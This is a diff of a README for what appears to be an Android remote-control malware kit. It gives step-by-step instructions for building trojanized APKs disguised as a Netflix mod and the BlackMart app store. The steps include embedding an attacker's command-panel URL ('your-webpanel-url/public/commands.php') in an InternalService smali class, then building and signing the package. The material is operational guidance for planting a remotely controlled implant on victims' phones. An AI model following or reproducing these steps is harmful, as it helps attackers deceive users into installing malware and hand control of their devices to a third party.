@@ -37,14 +37,14 @@ OR
 ---  
 ### Building Apk With Android Studio
 
-1. Open Project ***NetflixMod*** in Android Studio 
+1.  Open Project ***NetflixMod*** in Android Studio 
 2.  Put the `command.php` link of server in InternalService.class class
 3.  Build the Project
 4.  Zipalign and sign the Apk...
 ---
 ### Building Apk with ApkEasyTool:
 
-1. Navigate to ***\NetflixMod\smali\com\velociraptor\raptor*** 
+1. Unzip BlackMart(apktool).zip and  Navigate to ***\BlackMart\smali_classes2\com\velociraptor\raptor*** 
 2. Open InternalService.smali 
 3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
 ---
